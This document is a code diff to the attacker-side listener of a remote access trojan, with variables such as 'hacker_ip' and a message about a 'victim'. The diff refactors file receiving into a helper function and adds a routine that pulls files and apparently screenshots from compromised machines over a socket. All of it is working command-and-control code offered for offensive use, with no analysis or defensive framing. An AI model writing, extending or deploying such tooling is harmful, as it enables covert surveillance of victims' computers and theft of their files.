@@ -11,6 +11,21 @@ hacker_port = 10000
 hacker_socket.bind((hacker_ip, hacker_port))
 hacker_socket.listen(1)
 
+def file_receive(file_size):
+    received_data = b""
+    while len(received_data) < file_size:
+        try:
+            file_chunk = client_socket.recv(5242880)
+        except Exception as e:
+            print(f"\nError during file receive: {e}")
+            break
+        if not file_chunk:
+            print("\nConnection lost while downloading!")
+            break
+        received_data += file_chunk
+
+    return received_data
+
 print("Listening for incoming connections...")
 
 while True:
@@ -42,9 +57,39 @@ while True:
                     client_socket.send(command.encode())
                     response = client_socket.recv(4096).decode()
                     print(response)
+                    file_name = response[21:].strip()
                 except Exception as e:
                     print(f"\nSend failed: {e}")
                     continue
+                
+                try:
+                    raw_size = client_socket.recv(8)
+                except Exception as e:
+                    print(f"\nFailed to receive file size: {e}")
+                    continue
+
+                if len(raw_size) < 8:
+                    print("\nFailed to receive complete file size!")
+                    continue
+
+                file_size = struct.unpack("!Q", raw_size)[0]
+                print(f"Receiving file ({file_size} bytes)...\n")
+
+                received_data = file_receive(file_size)
+                try:
+                    with open(file_name, "wb") as file:
+                        file.write(received_data)
+                        print(f"{file_name} downloaded successfully!")
+                except Exception as e:
+                    print(f"\nFailed to write file: {e}")
+
+                try:
+                    screenshot_response = client_socket.recv(1024).decode()
+                    print(screenshot_response)
+                except Exception as e:
+                    print("No response received from victim!")
+                    continue
+
                 continue
 
             if command.startswith("download"):
@@ -83,18 +128,8 @@ while True:
                         file_size = struct.unpack("!Q", raw_size)[0]
                         print(f"Receiving file ({file_size} bytes)...\n")
 
-                        received_data = b""
-                        while len(received_data) < file_size:
-                            try:
-                                file_chunk = client_socket.recv(5242880)
-                            except Exception as e:
-                                print(f"\nError during file receive: {e}")
-                                break
-                            if not file_chunk:
-                                print("\nConnection lost while downloading!")
-                                break
-                            received_data += file_chunk
-
+                        received_data = file_receive(file_size)
+                    
                         file_name = command[9:].strip()
                         try:
                             with open(file_name, "wb") as file:
@@ -194,4 +229,3 @@ while True:
         print("\n[!] Interrupted by user. Closing session.")
         client_socket.close()
         break
-
